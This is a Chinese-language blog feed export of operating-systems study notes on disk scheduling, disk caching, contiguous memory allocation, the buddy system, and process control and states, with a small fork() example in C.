<h1 id="磁盘"><a href="#磁盘" class="headerlink" title="磁盘"></a>磁盘</h1><h2 id="磁盘的工作机制和传输时间"><a href="#磁盘的工作机制和传输时间" class="headerlink" title="磁盘的工作机制和传输时间"></a>磁盘的工作机制和传输时间</h2><p><img src="https://i.loli.net/2019/07/29/5d3ee60fa31ef69962.png"></p>
<p>磁盘I/O传输一般分为以下5个步骤：</p>
<ol>
<li>等待设备可用</li>
<li>等待通道（PIO或DMA通道）可用</li>
<li>寻道</li>
<li>旋转延迟</li>
<li>数据传输</li>
</ol>
<p>后四个步骤称为设备忙状态，所占用的时间为传输时间。</p>
<p>在磁盘I/O传输时间中，着重优化寻道时间。</p>
<h2 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h2><p>目的：通过优化磁盘访问请求顺序来提高磁盘访问性能</p>
<p>进行磁盘调度的原因：</p>
<ul>
<li>寻道时间是磁盘访问最耗时的部分</li>
<li>同时会有多个在同一磁盘上的I/O请求（所以可以调整顺序）</li>
<li>随机处理磁盘访问请求的性能表现很差</li>
</ul>
<p>下列算法中使用的例子：</p>
<ul>
<li>磁盘访问序列：<code>98, 183, 37, 122, 14, 124, 65, 67</code></li>
<li>初始磁头位置：<code>53</code></li>
</ul>
<table>
<thead>
<tr>
<th>算法</th>
<th>处理方式</th>
<th>特征</th>
<th>例子</th>
<th>移动距离</th>
</tr>
</thead>
<tbody><tr>
<td>先进先出（FIFO）算法</td>
<td>按顺序处理请求</td>
<td>能够保证公平；性能较差</td>
<td><code>53-&gt;98-&gt;183-&gt;37-&gt;122-&gt;14-&gt;124-&gt;65-&gt;67</code></td>
<td>640</td>
</tr>
<tr>
<td>最短服务时间优先（SSTF）算法</td>
<td>选择从磁臂当前位置需要移动最少的I/O请求</td>
<td>很不公平</td>
<td><code>53-&gt;65-&gt;67-&gt;14-&gt;98-&gt;122-&gt;124-&gt;183</code></td>
<td>236</td>
</tr>
<tr>
<td>扫描（SCAN）算法</td>
<td>磁臂在一个方向上移动，访问所有未完成的请求，直到磁臂到达该方向上最后的磁道；然后调换方向</td>
<td>判断简单；不公平，偏好中间位置磁道</td>
<td><code>53-&gt;37-&gt;14-&gt;0-&gt;65-&gt;67-&gt;98-&gt;122-&gt;124-&gt;183-&gt;199</code></td>
<td>236</td>
</tr>
<tr>
<td>循环扫描（C-SCAN）算法</td>
<td>对SCAN算法的改进：限制仅在一个方向上扫描；当最后一个磁道也被访问过了后，磁臂返回到磁盘的另外一端再次进行</td>
<td>比SCAN算法更公平</td>
<td><code>53-&gt;37-&gt;14-&gt;0-&gt;199-&gt;183-&gt;124-&gt;122-&gt;98-&gt;67-&gt;65</code></td>
<td>386</td>
</tr>
<tr>
<td>C-LOOK算法</td>
<td>对C-SCAN算法的改进：不走到磁盘的头，而是只走到最远的请求</td>
<td>同样能保证公平性</td>
<td><code>53-&gt;37-&gt;14-&gt;183-&gt;124-&gt;122-&gt;98-&gt;67-&gt;65</code></td>
<td>326</td>
</tr>
<tr>
<td>N步扫描（N-step-SCAN）算法</td>
<td>将磁盘请求队列分成长度为N的子队列，按FIFO算法依次处理所有子队列；再用扫描算法处理每个队列</td>
<td>防止磁头粘着现象</td>
<td><code>53-&gt;37-&gt;183-&gt;98-&gt;14-&gt;124-&gt;122-&gt;67-&gt;65</code></td>
<td>500</td>
</tr>
<tr>
<td>双队列扫描（FSCAN）算法</td>
<td>将磁盘请求队列分成两个子队列，交替使用扫描算法处理每一个队列；处理一个队列时，所有新生成的磁盘I/O请求都被放入另一队列中</td>
<td>比N步扫描更简单</td>
<td><code>53-&gt;37-&gt;183-&gt;122-&gt;98-&gt;67-&gt;65-&gt;14-&gt;124</code></td>
<td>441</td>
</tr>
</tbody></table>
<h2 id="磁盘缓存"><a href="#磁盘缓存" class="headerlink" title="磁盘缓存"></a>磁盘缓存</h2><p>缓存是数据传输双方访问速度差异较大时，引入的速度匹配中间层。</p>
<p>磁盘缓存是磁盘扇区在内存中的缓冲区。</p>
<ul>
<li>磁盘缓存的调度算法很类似虚拟存储调度算法</li>
<li>磁盘的访问频率远远低于虚拟存储中的内存访问频率</li>
<li>通常磁盘缓存调度算法会比虚拟存储复杂</li>
</ul>
<p><strong>单缓存与双缓存</strong></p>
<p>根据缓冲区个数分类：</p>
<ul>
<li>单缓存（Single Buffer Cache）：只有一个缓冲区，用户进程和I/O设备只能交替访问缓存区</li>
<li>双缓存（Double Buffer Cache）：设置两个缓存区，任何时刻用户进程和I/O设备可同时访问不同的缓存区</li>
</ul>
<p><strong>访问频率置换（Frequency-based Replacement）算法</strong></p>
<blockquote>
<p>在一段密集磁盘访问后，LFU算法的引用计数变化无法反映当前的引用情况</p>
</blockquote>
<p><strong>算法思路</strong></p>
<ul>
<li>考虑磁盘访问的密集特征，对密集引用不计数</li>
<li>在短周期中使用LRU算法，而在长周期中使用LFU算法</li>
</ul>
<p><strong>具体实现</strong></p>
<p>把LRU算法中的特殊栈分成3部分，并为每个缓存块增加一个引用计数</p>
<ul>
<li>新区域（New Section）：栈顶</li>
<li>中间区域（Middle Section）</li>
<li>旧区域（Old Section）：栈底</li>
</ul>
<p><img src="https://i.loli.net/2019/07/29/5d3eebdb0e18195381.png"></p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>连续内存分配算法</title>
    <url>/systems/pmm/</url>
    <content><![CDATA[<p>计算机会经常有访问内存的操作，内存最小访问单位是字节，每个字节都有自己的物理地址，MMU将程序的逻辑地址转化为物理地址后访问对应的字节。为了处理在分配过程中分配大小和实际使用大小的差异，引入了内存分配算法。内存分配分为连续内存分配和不连续内存分配两种方式，这取决于分配的物理内存空间是否连续。</p>
<a id="more"></a>

<h1 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h1><p>计算机体系结构由CPU、内存、I/O设备、总线组成。</p>
<p>CPU中包括：</p>
<ul>
<li>ALU、控制逻辑</li>
<li>寄存器</li>
<li>高速缓存：加快读写速度</li>
<li>存储管理单元（MMU）</li>
</ul>
<p>内存层次：<br><img src="https://i.loli.net/2019/07/26/5d3aea820b82267059.png">内存的特点：</p>
<ul>
<li>最小访问单位是字节（8bit）</li>
<li>一次可以读/写4字节（32位），有地址对齐问题</li>
</ul>
<h1 id="操作系统的内存管理方式"><a href="#操作系统的内存管理方式" class="headerlink" title="操作系统的内存管理方式"></a>操作系统的内存管理方式</h1><p><img src="https://i.loli.net/2019/07/26/5d3aeb35d5fc861361.png"></p>
<blockquote>
<p>操作系统内存管理特点</p>
</blockquote>
<ul>
<li>每个字节都有自己的物理地址</li>
<li>分为内存和外存(硬盘)</li>
<li>每个进程都有自己的内存空间，进程间的地址可以重叠</li>
<li>MMU：将逻辑地址(虚拟地址)转换为物理地址</li>
</ul>
<blockquote>
<p>内存管理方式</p>
</blockquote>
<ul>
<li>重定位（relocation）：修改段寄存器地址</li>
<li>分段（segmentation）：程序的逻辑结构不需要连成一片，而是分成代码、数据、堆栈3段；但每段的内容是连续的。</li>
<li>分页（paging）：分配内存以页为最小基本单位</li>
<li>虚拟存储（virtual memory）：目前多数系统（如Linux）采用的是按需页式虚拟存储</li>
</ul>
<p>内存管理方式的实现高度依赖硬件</p>
<ul>
<li>与计算机存储架构紧密耦合</li>
<li>MMU(memory  management unit)  处理CPU存储访问的硬件</li>
</ul>
<h1 id="地址空间和地址生成"><a href="#地址空间和地址生成" class="headerlink" title="地址空间和地址生成"></a>地址空间和地址生成</h1><h2 id="地址重定位"><a href="#地址重定位" class="headerlink" title="地址重定位"></a>地址重定位</h2><blockquote>
<p>静态地址重定位</p>
</blockquote>
<p>即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。<br>优点：无需硬件支持<br>缺点：1）程序重定位之后就不能在内存中搬动了；2）要求程序的存储空间是连续的，不能把程序放在若干个不连续的区域中。</p>
<blockquote>
<p>动态地址重定位</p>
</blockquote>
<p>在程序执行过程中进行地址重定位。更确切的说，是在每次访问内存单元前才进行地址变换。动态重定位可使装配模块不加任何修改而装入内存，但是它需要硬件(定位寄存器)的支持。<br>优点：1）目标模块装入内存时无需任何修改，因而装入之后再搬迁也不会影响其正确执行，这对于存储器紧缩、解决碎片问题是极其有利的；2）一个程序由若干个相对独立的目标模块组成时，每个目标模块各装入一个存储区域，这些存储区域可以不是顺序相邻的，只要各个模块有自己对应的定位寄存器就行。<br>缺点：需要硬件支持。</p>
<p>与物理地址、线性地址、逻辑地址对应，地址空间也有以下3种：</p>
<ul>
<li>物理地址空间：硬件支持的地址空间<ul>
<li>起始地址0</li>
<li>到MAXsys</li>
</ul>
</li>
<li>线性地址空间：CPU看到的地址<ul>
<li>起始地址0</li>
<li>大小取决于地址线的宽度</li>
</ul>
</li>
<li>逻辑地址空间：在CPU中运行的进程看到的地址<ul>
<li>起始地址0</li>
<li>到MAXprog</li>
<li>用户程序可见的地址</li>
</ul>
</li>
</ul>
<h2 id="地址生成过程"><a href="#地址生成过程" class="headerlink" title="地址生成过程"></a>地址生成过程</h2><p>逻辑地址的生成过程:</p>
<p><img src="https://i.loli.net/2019/07/30/5d3f89ab45cf536872.png"></p>
<p>生成地址一般有以下几种选择：</p>
<ul>
<li>编译时（优点：简单）<ul>
<li>假设起始地址已知</li>
<li>但如果起始地址改变，就必须重新编译</li>
<li>功能手机一般会有这种情况</li>
</ul>
</li>
<li>加载时<ul>
<li>如果加载时起始位置未知，编译器需生成可重定位的代码（relocatable code）</li>
<li>加载时，生成绝对地址</li>
</ul>
</li>
<li>执行时（优点：灵活）<ul>
<li>执行时代码可移动</li>
<li>需地址转换（映射）硬件支持（一般是虚拟存储）</li>
</ul>
</li>
</ul>
<h1 id="连续内存分配"><a href="#连续内存分配" class="headerlink" title="连续内存分配"></a>连续内存分配</h1><p>连续内存分配即给进程分配一块不小于指定大小的连续物理内存区域。但是在分配过程中，分配大小和实际使用大小之前有差距，因此会有不能被利用的内存空间，即内存碎片。</p>
<p>内存碎片分为</p>
<ul>
<li><strong>外部碎片</strong> 分配单元之间未被使用内存</li>
<li><strong>内部碎片</strong> 分配单元内部未被使用的内存 由于取整导致</li>
</ul>
<p>连续内存分配的使用场景为动态分区分配，动态分区分配时需要满足以下要求：</p>
<ul>
<li><p> 当程序被加载执行时，分配一个进程指定大小可变的分区（块）</p>
</li>
<li><p>分区的地址是连续的</p>
</li>
</ul>
<p>一般来说，操作系统需要维护至少2个数据结构，里面存储的内容是：</p>
<ul>
<li>所有进程的已分配分区</li>
<li>空闲分区（Empty-blocks）</li>
</ul>
<h2 id="连续内存分配策略"><a href="#连续内存分配策略" class="headerlink" title="连续内存分配策略"></a>连续内存分配策略</h2><p>常见的几种连续内存分配策略包括：</p>
<ul>
<li>最先匹配（First-fit）</li>
<li>最佳匹配（Best-fit）</li>
<li>最差匹配（worst-fit）</li>
</ul>
<blockquote>
<p>最先匹配（First Fit Allocation）策略</p>
</blockquote>
<p>思路：需要分配n个字节时，使用第一个可用的空间比n大的空闲块</p>
<p>原理和实现：</p>
<ul>
<li>空闲分区列表按地址顺序排序</li>
<li>分配时搜索第一个合适的分区</li>
<li>释放分区时，检查是否可与邻近的空闲分区合并</li>
</ul>
<p>优点：</p>
<ul>
<li>简单</li>
<li>在高地址空间有大块的空闲分区</li>
</ul>
<p>缺点：</p>
<ul>
<li>容易产生外部碎片</li>
<li>分配大块时较慢</li>
</ul>
<blockquote>
<p>最佳匹配（Best Fit Allocation）策略</p>
</blockquote>
<p>思路：分配n字节内存时，查找并使用不小于n的最小空闲分区</p>
<p>原理和实现：</p>
<ul>
<li>空闲分区列表按照大小排序</li>
<li>分配时，查找一个合适的分区</li>
<li>释放时，查找并合并邻近的空闲分区（如果找到）</li>
</ul>
<p>优点：</p>
<ul>
<li>大部分分配的尺寸较小时，效果很好<ul>
<li>可避免大的空闲分区被拆分</li>
<li>可减小外部碎片的大小</li>
<li>相对简单</li>
</ul>
</li>
</ul>
<p>缺点：</p>
<ul>
<li>外部碎片较多</li>
<li>释放分区较慢</li>
<li>容易产生很多无用的小碎片</li>
</ul>
<p><strong>最先匹配会越用越慢吗？</strong> </p>
<p>最先匹配总是先找低地址空间的内存，到后期低地址空间都是大量小的不连续的内存空间，每次都要扫描低地址空间后到达高地质空间才能得到可用的内存。</p>
<blockquote>
<p>最差匹配（Worst Fit Allocation）策略</p>
</blockquote>
<p>思路：分配n字节时，使用尺寸不小于n的最大空闲分区</p>
<p>原理和实现：</p>
<ul>
<li>空闲分区列表按由大到小排序</li>
<li>分配时，选最大的分区</li>
<li>释放时，检查是否可与邻近的空闲分区合并，进行可能的合并，并调整空闲分区列表顺序</li>
</ul>
<p>优点：</p>
<ul>
<li>中等大小的分配较多时，效果最好</li>
<li>避免出现太多的小碎片</li>
</ul>
<p>缺点：</p>
<ul>
<li>释放分区较慢</li>
<li>外部碎片较多</li>
<li>容易破坏大的空闲分区，因此难以分配大的分区</li>
</ul>
<p>以上连续分配算法均会产生外碎片，而不产生内碎片。</p>
<p><strong>最差匹配的外碎片会比最优适配算法少吗？</strong></p>
<p>应该会的。因为每次都找到最大的内存块进行分割，因此分割剩下的内存块也很大，往往还可以再装下一个程序。</p>
<h2 id="碎片整理"><a href="#碎片整理" class="headerlink" title="碎片整理"></a>碎片整理</h2><p>通过调整进程占用的分区位置来减少或避免分区碎片</p>
<blockquote>
<p>碎片紧凑 (compaction)</p>
</blockquote>
<p>通过移动分配给进程的内存分区 以合并外部碎片</p>
<ul>
<li>进行碎片紧凑的条件：所有的应用程序可动态重定位</li>
<li>需要在应用程序等待时进行移动</li>
<li>需要考虑开销</li>
</ul>
<blockquote>
<p>分区对换 (Swapping in/out)</p>
</blockquote>
<p>通过抢占并回收处于等待状态进程的分区 存到外存里去 以增大可用内存空间</p>
<p><strong>对换和紧凑都是碎片整理技术，它们的主要区别是什么？为什么在早期的操作系统中采用对换技术？</strong></p>
<p>区别是，紧凑是在内存中搬动进程占用的内存位置，以合并出大块的空闲块；对换是把内存中的进程搬到外存中，以空出更多的内存空闲块。采用对换的原因是，处理简单。不过代价也比较高，因为外存比较慢。</p>
<h2 id="伙伴系统"><a href="#伙伴系统" class="headerlink" title="伙伴系统"></a>伙伴系统</h2><p>伙伴系统（Buddy System）是一种连续存储分配的办法，它解决了分配位置和碎片的问题。</p>
<p><img src="https://i.loli.net/2019/07/26/5d3af4b82023762335.png"></p>
<p><img src="https://i.loli.net/2019/07/26/5d3af4de539a583350.png"></p>
<p><img src="https://i.loli.net/2019/07/26/5d3af4fe4d84d85800.png"></p>
<blockquote>
<p>伙伴系统的内存回收流程？</p>
</blockquote>
<p>当释放多页的块时，内核首先计算出该内存块的伙伴的地址。内核将满足以下条件的三个块称为伙伴：</p>
<ol>
<li>两个块具有相同的大小，记作$b$。</li>
<li>它们的物理地址是连续的。</li>
<li>第一块的第一个页的物理地址是$2*(2^b)$的倍数。</li>
</ol>
<p>如果找到了该内存块的伙伴，确保该伙伴的所有页都是空闲的，以便进行合并。内存继续检查合并后页块的“伙伴”并检查是否可以合并，依次类推。</p>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>进程控制</title>
    <url>/systems/proc-control/</url>
    <content><![CDATA[<p> 进程生命周期存在多个状态，多个状态间可以相互转换。在unix系统中提供了一系列与进程状态相关的系统调用，比如fork用于创建新进程，exit用于退出进程，wait用于父进程等待子进程结束。</p>
<a id="more"></a>

<h1 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h1><p><strong>进程切换的概念</strong></p>
<ul>
<li>暂停当前运行进程 从运行状态变成其他状态</li>
<li>调度另一个进程从就绪状态变成运行状态</li>
</ul>
<p><strong>进程切换的要求</strong></p>
<ul>
<li>切换前 保存进程上下文</li>
<li>切换后 恢复进程上下文</li>
<li>切换快速，因为在程序执行过程中进程切换的频率相当高</li>
</ul>
<p><strong>进程切换图示</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3cf69bba0ed12499.png"></p>
<h1 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h1><p>进程控制块记录内核的进程状态，内核为每个进程维护对应的进程控制块，将相同状态的进程的PCB放在同一队列。</p>
<p><img src="https://i.loli.net/2019/07/28/5d3cf7cf5fa8221334.png"></p>
<h1 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h1><p>不同操作系统均提供了进程创建的系统调用接口。</p>
<ul>
<li>Windows进程创建API CreateProcess()</li>
<li>Unix进程创建系统调用 fork/exec<ul>
<li>fork() 把一个进程复制成两个进程 父子进程的PID不同</li>
<li>exec() 用新程序来重写当前进程 PID 不变</li>
</ul>
</li>
</ul>
<h2 id="fork示例"><a href="#fork示例" class="headerlink" title="fork示例"></a>fork示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int pid &#x3D; fork()；		&#x2F;&#x2F; 创建子进程，复制两个进程</span><br><span class="line">if(pid &#x3D;&#x3D; 0) &#123;			&#x2F;&#x2F; 子进程在这里继续</span><br><span class="line">     &#x2F;&#x2F; Do anything (unmap memory, close net connections…)</span><br><span class="line">	exec(“program”, argc, argv0, argv1, …);&#x2F;&#x2F;加载程序</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>fork() 创建一个继承的子进程<ul>
<li>复制父进程的所有变量和内存</li>
<li>复制父进程的所有 CPU 寄存器(一个寄存器例外，用于区别父进程和子进程)</li>
</ul>
</li>
<li>fork() 的返回值<ul>
<li>子进程的 fork() 返回值 为 0</li>
<li>父进程的 fork() 返回值为 子进程标识符</li>
<li>子进程可使用 getpid() 获取 PID</li>
</ul>
</li>
<li>系统调用exec()加载新程序取代当前运行进程，除了pid相同，其余均替换。</li>
</ul>
<p><strong>fork地址空间复制</strong></p>
<p><img src="https://i.loli.net/2019/07/28/5d3cf960b093e60975.png"></p>
<p><strong>fork使用示例</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;  i&lt;LOOP;  i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, “Fork Failed”);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,  “i=%d,  pid=%d,  parent  pid=%d\n”,I,      </span><br><span class="line">                getpid() ,getppid());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行后生成进程如下所示</p>
<p><img src="https://i.loli.net/2019/07/28/5d3cfa664f6cb18712.png"></p>
<p>进程个数：1-&gt;2-&gt;4-&gt;8，从上我们可以看出，进程pid号并不是严格按照创建进程的顺序执行，根据调度算法，就绪队列执行顺序不同。</p>
<p><strong>fork 的开销</strong></p>
<ul>
<li>对子进程分配内存</li>
<li>复制父进程的内存和CPU寄存器到子进程</li>
</ul>
<p>在大多数情况下,调用 fork() 以后会调用 exec() 将 fork() 复制出来的子进程的内存给覆盖掉 fork()。因此在fork()操作中内存操作是没有任何作用的，子进程可能关闭打开文件和连接。</p>
<p><strong>vfork()</strong></p>
<ul>
<li> 创建进程时，不再创建一个同样的内存映像。</li>
<li> 子进程应该立即调用 exec() </li>
<li>现在使用 Copy on Write (COW)即写时复制技术</li>
</ul>
<p>（北京工业大学）子进程可以继承它的父进程所拥有的所有资源（）</p>
<ul>
<li><input disabled="" type="checkbox"> 对</li>
<li><input checked="" disabled="" type="checkbox"> 错</li>
</ul>
<p>子进程继承了父进程的代码段和数据段资源，堆栈段则是自己的</p>
<h2 id="程序加载与执行"><a href="#程序加载与执行" class="headerlink" title="程序加载与执行"></a>程序加载与执行</h2><p>exec()加载新程序并覆盖原来的内存地址空间取代当前运行程序，代码段、堆栈、和堆完全重写，pid号仍和之前相同。</p>
<p>系统调用exec( )允许进程“加载”一个完全不同的程序，并从main开始执行。</p>
<h1 id="进程等待与退出"><a href="#进程等待与退出" class="headerlink" title="进程等待与退出"></a>进程等待与退出</h1><h2 id="进程等待"><a href="#进程等待" class="headerlink" title="进程等待"></a>进程等待</h2><p>wait() 系统调用用于父进程等待子进程的结束</p>
<ul>
<li>子进程结束时通过exit() 向父进程返回一个值</li>
<li>父进程通过wait() 接受并处理返回值</li>
</ul>
<p>父进程wait()先于子进程exit()，</p>
<ul>
<li>父进程进入等待状态，等待子进程的返回结果</li>
<li>当某子进程调用 exit() 时 唤醒父进程 将 exit() 返回值作为 父进程 wait() 的返回值</li>
</ul>
<p>父进程wait()后于子进程exit()，有僵尸子进程等待，wait()立即返回其中一个值。</p>
<p>当无子进程存活时，wait()立即返回。</p>
<h2 id="进程退出"><a href="#进程退出" class="headerlink" title="进程退出"></a>进程退出</h2><p>进程结束执行时，调用 exit() 完成进程资源回收。</p>
<p>exit() 系统调用的功能</p>
<ul>
<li>将调用参数作为进程的 结果(返回值)</li>
<li>关闭所有打开的文件等占用资源</li>
<li>释放内存</li>
<li>释放大部分进程相关的内核数据结构</li>
<li>检查父进程是否还存活<ul>
<li>存活 保留结果的值 直到父进程需要它 进入 僵尸(zombie/defunct)状态</li>
<li>非存活 释放所有的数据结构和结果</li>
</ul>
</li>
<li>清理所有等待的僵尸进程</li>
</ul>
<blockquote>
<p>什么是僵尸进程和孤儿进程</p>
</blockquote>
<p>孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。</p>
<p>僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵尸进程。</p>
<h1 id="进程控制与进程状态关系"><a href="#进程控制与进程状态关系" class="headerlink" title="进程控制与进程状态关系"></a>进程控制与进程状态关系</h1><p><img src="https://i.loli.net/2019/07/28/5d3d00e7554e429648.png"></p>
<p><strong>其他进程控制系统调用</strong></p>
<ul>
<li>优先级控制<ul>
<li>nice() 指定进程的初始优先级</li>
<li>Unix系统中 进程优先级会随着执行时间而衰减</li>
</ul>
</li>
<li>进程调试支持<ul>
<li>ptrace() 允许一个进程控制另一个进程的执行</li>
<li>设置断点和查看寄存器等</li>
</ul>
</li>
<li>定时<ul>
<li>sleep() 可以让进程在定时器的等待队列中等待指定的时间</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>进程 线程</title>
    <url>/systems/process-thread/</url>
    <content><![CDATA[<p>现代操作系统(比如Mac OS X，UNIX，Linux，Windows等）均为多用户操作系统。什么是多用户呢？概括一下，就是操作系统可以运行多个任务，我们可以一边用Chrome浏览器浏览网页，一边用网易云音乐听歌，这就是多任务。我们也可以在windows下任务管理器中看到多个正在执行的任务。对于操作系统来说，一个任务就是一个进程，进程内的子任务即为线程。</p>
<a id="more"></a>

<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>指一个具有一定独立功能的程序在一个数据集合上的一次动态执行的过程</p>
<h2 id="进程的组成"><a href="#进程的组成" class="headerlink" title="进程的组成"></a>进程的组成</h2><p>进程包含了正在运行的程序所有状态信息</p>
<ul>
<li>代码</li>
<li>数据</li>
<li>状态寄存器<ul>
<li>CPU状态CR0</li>
<li>指令指针 EIP</li>
</ul>
</li>
<li>通用寄存器</li>
<li>进程占用的系统资源<ul>
<li>打开文件</li>
<li>已分配内存</li>
</ul>
</li>
</ul>
<h2 id="进程的特点"><a href="#进程的特点" class="headerlink" title="进程的特点"></a>进程的特点</h2><ul>
<li><strong>动态性</strong> 可动态创建 、结束进程</li>
<li><strong>并发性</strong> 进程可以被独立调度并占用CPU运行</li>
<li><strong>独立性</strong>  进程是资源分配和调度的基本单位，不同进程的工作互不影响</li>
<li><strong>制约性</strong> 因访问共享数据、资源， 进程间的同步而产生制约</li>
</ul>
<h2 id="进程与程序的联系"><a href="#进程与程序的联系" class="headerlink" title="进程与程序的联系"></a>进程与程序的联系</h2><p>进程是操作系统处于执行状态下的程序的抽象。同一个程序的多次执行过程对应为不同的进程。</p>
<p>程序：对实现预期目的一系列动作的执行过程的描述，由一系列操作指令的序列组成。</p>
<p>程序是进程的组成之一，同一个程序可对应多个不同进程。</p>
<ul>
<li>程序 = 文件(静态可执行文件)</li>
<li>进程 = 执行中的程序 = 程序 + 执行状态</li>
</ul>
<p><strong>进程执行需要的资源</strong></p>
<ul>
<li><strong>CPU</strong> 执行指令</li>
<li><strong>内存</strong> 保存代码和数据</li>
</ul>
<h2 id="进程与程序的区别"><a href="#进程与程序的区别" class="headerlink" title="进程与程序的区别"></a>进程与程序的区别</h2><ul>
<li>进程是动态的，程序是静态的。<ul>
<li>程序是有序代码的集合</li>
<li>进程是程序的执行，进程有内核态和用户态</li>
</ul>
</li>
<li>进程是暂时的(是一个状态变化的过程，有开始和结束状态) 程序是永久的(可长久保存)</li>
<li>进程与程序的组成不同<ul>
<li>进程的组成包括程序 、数据、 进程控制块</li>
</ul>
</li>
</ul>
<h2 id="进程控制块"><a href="#进程控制块" class="headerlink" title="进程控制块"></a>进程控制块</h2><p> 进程控制块 (PCB Process Control Block)为操作系统管理控制进程运行所用的信息集合，由操作系统用于描述进程的基本情况以及运行变化的过程。</p>
<p><strong>PCB 是进程存在的唯一标识</strong></p>
<ul>
<li>每个进程都在操作系统中有一个对应的 PCB</li>
</ul>
<p><strong>进程控制块信息</strong></p>
<ul>
<li>进程标识信息 (PID)</li>
<li>处理机现场保存 </li>
<li>进程控制信息 (调度优先级)<ul>
<li>调度和状态信息 (调度进程和处理机使用情况)</li>
<li>进程间通信信息</li>
<li>存储管理信息 (指向进程映像存储空间数据结构，占用的存储空间用完以后还给操作系统)</li>
<li>进程所用资源 (进程使用的系统资源 、打开文件)</li>
<li>有关数据结构连接信息 (与PCB相关的进程队列，不同的状态处于不同的进程队列)</li>
</ul>
</li>
</ul>
<p><strong>进程控制块的组织</strong></p>
<blockquote>
<p>链表</p>
</blockquote>
<p>同一状态的进程其 PCB 成一链表，多个状态对应多个不同的链表</p>
<ul>
<li>各状态的进程形成不同的链表：就绪链表、阻塞链表</li>
</ul>
<blockquote>
<p>索引表</p>
</blockquote>
<p>同一状态的进程归入一个 索引表(由索引指向PCB) 多个状态对应多个不同的索引表</p>
<ul>
<li>各状态的进程形成不同的索引表：就绪索引表、阻塞索引表</li>
</ul>
<h2 id="进程的生命周期"><a href="#进程的生命周期" class="headerlink" title="进程的生命周期"></a>进程的生命周期</h2><p><strong>进程创建</strong> 操作系统分配进程所需要的资源，构建 PCB</p>
<ul>
<li>系统初始化时</li>
<li>用户请求创建一个新进程</li>
<li>正在运行的进程执行了创建进程的系统调用</li>
</ul>
<p><strong>进程执行</strong></p>
<ul>
<li>进程创建完后 会放入就绪队列，等待CPU调度</li>
<li>内核选择一个就绪的进程(调度算法)，让它占用处理机并执行</li>
</ul>
<p><strong>进程等待(阻塞)</strong> 只有进程本身才知道何时需要等待某种时间的发生(主动)</p>
<ul>
<li>请求并等待的系统服务，无法马上完成</li>
<li>启动某个操作，无法马上完成</li>
<li>需要的数据没有到达</li>
</ul>
<p><strong>进程抢占</strong></p>
<ul>
<li>高优先级进程就绪</li>
<li>进程执行时间片用完</li>
</ul>
<p><strong>进程唤醒</strong> 进程唤醒只能由别的进程或操作系统唤醒(被动)</p>
<ul>
<li>被阻塞的进程需要的资源可被满足</li>
<li>被阻塞的进程等待的事件到达</li>
</ul>
<p><strong>进程结束</strong> 将进程所占用的资源还给操作系统</p>
<ul>
<li>正常退出</li>
<li>错误退出</li>
<li>致命错误(强制性的)</li>
<li>被其他进程所杀(强制性的)</li>
</ul>
<h2 id="三状态进程模型"><a href="#三状态进程模型" class="headerlink" title="三状态进程模型"></a>三状态进程模型</h2><p><strong>运行状态(Running)</strong></p>
<ul>
<li>进程正在处理机上执行</li>
</ul>
<p><strong>就绪状态(Ready)</strong></p>
<ul>
<li>进程获得了除处理机之外的所需资源，得到处理机后可运行</li>
<li>进程执行的当前时间片用完了，此时进程处于就绪态</li>
</ul>
<p><strong>等待状态(又称阻塞状态 Blocked)</strong></p>
<ul>
<li>进程正在等待某个事件而暂停的状态</li>
</ul>
<p><strong>创建状态(New)</strong></p>
<ul>
<li>进程正在被创建，还没到就绪状态前的状态</li>
</ul>
<p><strong>结束状态(Exit)</strong></p>
<ul>
<li>进程正在从系统中消失时的状态，系统正在回收它所占用的资源</li>
</ul>
<p><img src="https://i.loli.net/2019/07/28/5d3cebecbce7c91653.png"></p>
<p>进程在整个生命周期分为三种基本状态，就绪、运行、等待。</p>
